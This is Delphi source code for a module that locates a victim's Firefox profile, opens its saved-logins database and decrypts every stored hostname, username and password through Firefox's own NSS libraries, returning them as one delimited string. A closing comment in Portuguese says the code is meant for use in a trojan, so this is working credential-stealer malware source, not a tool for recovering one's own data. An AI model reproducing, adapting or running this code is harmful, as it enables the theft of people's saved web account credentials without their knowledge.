unit UnitFireFox3_5;

interface

uses
  StrUtils,windows,
  sysutils;

function Mozilla3_5Password(Delimitador: string): string;

implementation

uses
  SQLiteTable3,
  sqlite3,
  UnitServerUtils;

var
  version,
  FireFoxPath: string;

function strtofloat(s: string): extended;
var
  res: extended; code: integer;
begin
  try
    val(s, res, code);
    strtofloat := res;
    except
    Result := 0;
  end;
end;

function ReadKeyToString(hRoot:HKEY; sKey:string; sSubKey:string):string;
var
  hOpen: HKEY;
  sBuff: array[0..255] of char;
  dSize: integer;
begin
  if (RegOpenKeyEx(hRoot, PChar(sKey), 0, KEY_QUERY_VALUE, hOpen) = ERROR_SUCCESS) then
  begin
    dSize := SizeOf(sBuff);
    RegQueryValueEx(hOpen, PChar(sSubKey), nil, nil, @sBuff, @dSize);
    Result := sBuff
  end;
  RegCloseKey(hOpen);
end;

procedure GetFFInfos;
var
  i, j: integer;
begin
  version := ReadKeyToString(HKEY_LOCAL_MACHINE, 'SOFTWARE\Mozilla\Mozilla Firefox', 'CurrentVersion');
  if version = '' then
  version := ReadKeyToString(HKEY_LOCAL_MACHINE, 'SOFTWARE\Wow6432Node\Mozilla\Mozilla Firefox', 'CurrentVersion');

  FireFoxPath:= ReadKeyToString(HKEY_LOCAL_MACHINE, 'SOFTWARE\Mozilla\Mozilla Firefox\' + version + '\Main', 'Install Directory') + '\';
  if FireFoxPath = '' then
  FireFoxPath:= ReadKeyToString(HKEY_LOCAL_MACHINE, 'SOFTWARE\Wow6432Node\Mozilla\Mozilla Firefox\' + version + '\Main', 'Install Directory') + '\';

  for i := length(version) downto 1 do
  begin
    if posex(Version[i], '1234567890.') <= 0 then
    delete(Version, i, 1);
  end;

  j := 0;
  for i := 1 to length(version) do if Version[i] = '.' then inc(j);
  if j <= 1 then exit;

  for i := length(version) downto 1 do
  if (Version[i] = '.') and (i > posex('.', Version)) then delete(Version, i, 1);
end;

function Mozilla3_5Password(Delimitador: string): string;
type
  TSECItem = packed record
  SECItemType: dword;
  SECItemData: pchar;
  SECItemLen: dword;
end;
  PSECItem = ^TSECItem;
var
  NSSModule: THandle;
  hToken: THandle;
  NSS_Init: function(configdir: pchar): dword; cdecl;
  NSSBase64_DecodeBuffer: function(arenaOpt: pointer; outItemOpt: PSECItem; inStr: pchar; inLen: dword): dword; cdecl;
  PK11_GetInternalKeySlot: function: pointer; cdecl;
  PK11_Authenticate: function(slot: pointer; loadCerts: boolean; wincx: pointer): dword; cdecl;
  PK11SDR_Decrypt: function(data: PSECItem; result: PSECItem; cx: pointer): dword; cdecl;
  NSS_Shutdown: procedure; cdecl;
  PK11_FreeSlot: procedure(slot: pointer); cdecl;
  ProfilePath: array [0..MAX_PATH] of char;
  ProfilePathLen: dword;
  FirefoxProfilePath: pchar;
  MainProfile: array [0..MAX_PATH] of char;
  MainProfilePath: pchar;
  EncryptedSECItem: TSECItem;
  DecryptedSECItem: TSECItem;
  SQLiteDatabase: TSQLiteDatabase;
  SQLIteTable: TSQLIteTable;
  KeySlot: pointer;
  i:integer;
  username, password: string;
  V: Extended;
begin
  GetFFInfos;
  if (FireFoxPath = '') or (Version = '') then Exit;

  merdadll := '';
  if length(version) < 1 then exit;

  V := StrToFloat(Version);
  if V < 3.5 then exit;

  if V >= 4 then merdadll := FireFoxPath + 'mozsqlite3.dll' else// SQLite3.pas
  merdadll := FireFoxPath + 'sqlite3.dll'; // SQLite3.pas

  //Quando der algum erro de dll, adicionar  LoadLibrary(pchar(FirefoxPath + 'DLL QUE FALTA'));
  LoadLibrary(pchar(FirefoxPath + 'mozglue.dll'));
  LoadLibrary(pchar(FirefoxPath + 'mozcrt19.dll'));
  LoadLibrary(pchar(FirefoxPath + 'mozutils.dll'));
  LoadLibrary(pchar(FirefoxPath + 'nspr4.dll'));
  LoadLibrary(pchar(FirefoxPath + 'plc4.dll'));
  LoadLibrary(pchar(FirefoxPath + 'plds4.dll'));
  LoadLibrary(pchar(FirefoxPath + 'nssutil3.dll'));

  NSSModule := LoadLibrary(pchar(FirefoxPath + 'nss3.dll'));
  @NSS_Init := GetProcAddress(NSSModule, pchar('NSS_Init'));
  @NSSBase64_DecodeBuffer := GetProcAddress(NSSModule, pchar('NSSBase64_DecodeBuffer'));
  @PK11_GetInternalKeySlot := GetProcAddress(NSSModule, pchar('PK11_GetInternalKeySlot'));
  @PK11_Authenticate := GetProcAddress(NSSModule, pchar('PK11_Authenticate'));
  @PK11SDR_Decrypt := GetProcAddress(NSSModule, pchar('PK11SDR_Decrypt'));
  @NSS_Shutdown := GetProcAddress(NSSModule, pchar('NSS_Shutdown'));
  @PK11_FreeSlot := GetProcAddress(NSSModule, pchar('PK11_FreeSlot'));

  OpenProcessToken(GetCurrentProcess, TOKEN_QUERY, hToken);
  ProfilePathLen := MAX_PATH;
  ZeroMemory(@ProfilePath, MAX_PATH);
  GetEnvironmentVariable('APPDATA', ProfilePath, ProfilePathLen);
  FirefoxProfilePath := pchar(profilePath +'\Mozilla\Firefox\profiles.ini');
  GetPrivateProfileString('Profile0', 'Path', '', MainProfile, MAX_PATH, FirefoxProfilePath);
  MainProfilePath := pchar(profilePath + '\Mozilla\Firefox\' + mainProfile + '\' + 'signons.sqlite');
  SQLiteDatabase := TSQLiteDatabase.Create(MainProfilePath);
  SQLIteTable := SQLiteDatabase.GetTable('SELECT * FROM moz_logins');

  if SQLIteTable.Count > 0 then
  begin
    if NSS_Init(pchar(profilePath + '\Mozilla\Firefox\' + mainProfile)) = 0 then
    begin
      KeySlot := PK11_GetInternalKeySlot;
      if KeySlot <> nil then
      begin
        if PK11_Authenticate(KeySlot, True, nil) = 0 then
        begin
          for i := 0 to SQLIteTable.Count -1 do
          begin
            ZeroMemory(@EncryptedSECItem, SizeOf(EncryptedSECItem));
            ZeroMemory(@DecryptedSECItem, SizeOf(DecryptedSECItem));

            result := result + SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['hostname']) + Delimitador;
            username:= SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['encryptedUsername']);
            Password := SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['encryptedPassword']);


            NSSBase64_DecodeBuffer(nil, @EncryptedSECItem, pchar(Username), Length(Username));
            PK11SDR_Decrypt(@EncryptedSECItem, @DecryptedSECItem, nil);
            Result := result + DecryptedSECItem.SECItemData + Delimitador;


            ZeroMemory(@EncryptedSECItem, SizeOf(EncryptedSECItem));
            ZeroMemory(@DecryptedSECItem, SizeOf(DecryptedSECItem));


            NSSBase64_DecodeBuffer(nil, @EncryptedSECItem, pchar(Password), Length(Password));
            PK11SDR_Decrypt(@EncryptedSECItem, @DecryptedSECItem, nil);
            Result := result + DecryptedSECItem.SECItemData + Delimitador + #13#10;


            SQLIteTable.Next;
          end;
        end else result:= result + '';//'PK11_Authenticate Failed!';
        PK11_FreeSlot(KeySlot);
      end else
      result:= result + '';//'PK11_GetInternalKeySlot Failed!';
      NSS_Shutdown;
    end else
    result:= result + '';//'NSS_Init Failed!';
  end;
  SQLIteTable.Free;
  SQLiteDatabase.Free;

  // para usar no trojan...
end;

end.
